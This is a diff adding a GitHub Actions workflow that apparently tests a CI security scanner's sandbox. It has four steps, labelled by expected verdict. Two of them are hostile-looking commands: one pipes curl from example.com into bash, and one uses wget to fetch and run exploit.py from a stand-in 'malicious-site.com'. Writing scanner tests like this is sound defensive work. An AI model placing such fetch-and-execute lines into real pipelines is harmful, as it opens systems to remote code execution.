@@ -1,0 +1,30 @@
+name: Sandbox Security Test
+on: [push, pull_request]
+
+jobs:
+  test-security-scanning:
+    runs-on: ubuntu-latest
+    steps:
+      # 1. SAFE STEP (Should NOT trigger sandbox)
+      - name: Safe Echo
+        run: echo "This is a safe step and should be ignored."
+
+      # 2. SUSPICIOUS BASH (Should trigger Sandbox -> Verdict: Safe/Unsafe depending on URL)
+      # This mimics the "curl | bash" pattern your scanner looks for.
+      - name: Dangerous Pipe
+        run: |
+          echo "Downloading external script..."
+          curl -sL https://example.com/install.sh | bash
+
+      # 3. SUSPICIOUS PYTHON (Should trigger Sandbox -> Verdict: Safe)
+      # Your scanner looks for "python" in the run block.
+      - name: Python Inline
+        run: |
+          python -c "import os; print('I am running inside the sandbox container!')"
+
+      # 4. MALICIOUS SIMULATION (Should trigger Sandbox -> Verdict: Unsafe/Suspicious)
+      # Trying to access sensitive files or network (Sandboxing should block/detect this)
+      - name: Malicious Attempt
+        run: |
+          wget http://malicious-site.com/exploit.py
+          python exploit.py
